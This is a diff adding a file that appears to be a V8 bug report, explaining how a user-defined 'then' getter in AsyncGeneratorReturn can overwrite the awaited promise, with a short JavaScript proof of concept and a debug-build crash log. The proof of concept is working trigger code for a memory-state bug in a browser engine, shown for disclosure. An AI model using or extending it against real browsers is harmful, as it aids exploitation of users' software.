@@ -1,0 +1,70 @@
+/*
+Here's a snippet of AsyncGeneratorReturn. (https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-async-generator-gen.cc?rcl=bcd1365cf7fac0d7897c43b377c143aae2d22f92&l=650)
+
+  Node* const context = Parameter(Descriptor::kContext);
+  Node* const outer_promise = LoadPromiseFromAsyncGeneratorRequest(req);
+  Node* const promise =
+      Await(context, generator, value, outer_promise, AwaitContext::kLength,
+            init_closure_context, var_on_resolve.value(), var_on_reject.value(),
+            is_caught);
+
+  CSA_SLOW_ASSERT(this, IsGeneratorNotSuspendedForAwait(generator));
+  StoreObjectField(generator, JSAsyncGeneratorObject::kAwaitedPromiseOffset,
+                   promise);
+
+The Await methods calls ResolveNativePromise which calls InternalResolvePromise which can invoke user JavaScript code through a "then" getter. If the AwaitedPromise is replaced by the user script, the AwaitedPromise will be immediately overwritten after the call to Await, this may lead the generator to an incorrect state.
+
+PoC:
+*/
+
+async function* asyncGenerator() {
+}
+
+let gen = asyncGenerator();
+gen.return({
+    get then() {
+        delete this.then;
+
+        gen.next();
+    }
+});
+
+/*
+Log in debug mode:
+abort: CSA_ASSERT failed: IsNotUndefined(request) [../../src/builtins/builtins-async-generator-gen.cc:328]
+
+
+==== JS stack trace =========================================
+
+Security context: 0x2b29083a3a71 <JSObject>#0#
+    2: /* anonymous */(this=0x19b7b0603721 <JSGlobal Object>#1#,0x19b7b060d139 <Object map = 0x189055388c91>#2#)
+
+==== Details ================================================
+
+[2]: /* anonymous */(this=0x19b7b0603721 <JSGlobal Object>#1#,0x19b7b060d139 <Object map = 0x189055388c91>#2#) {
+// optimized frame
+--------- s o u r c e   c o d e ---------
+<No Source>
+-----------------------------------------
+}
+==== Key         ============================================
+
+ #0# 0x2b29083a3a71: 0x2b29083a3a71 <JSObject>
+ #1# 0x19b7b0603721: 0x19b7b0603721 <JSGlobal Object>
+ #2# 0x19b7b060d139: 0x19b7b060d139 <Object map = 0x189055388c91>
+=====================
+
+Received signal 4 ILL_ILLOPN 7fb143ae2781
+
+==== C stack trace ===============================
+
+ [0x7fb143ae643e]
+ [0x7fb143ae6395]
+ [0x7fb1436ce390]
+ [0x7fb143ae2781]
+ [0x7fb1430f23ae]
+ [0x7fb1430f1ef7]
+ [0x1c8e08204384]
+[end of stack trace]
+Illegal instruction
+*/
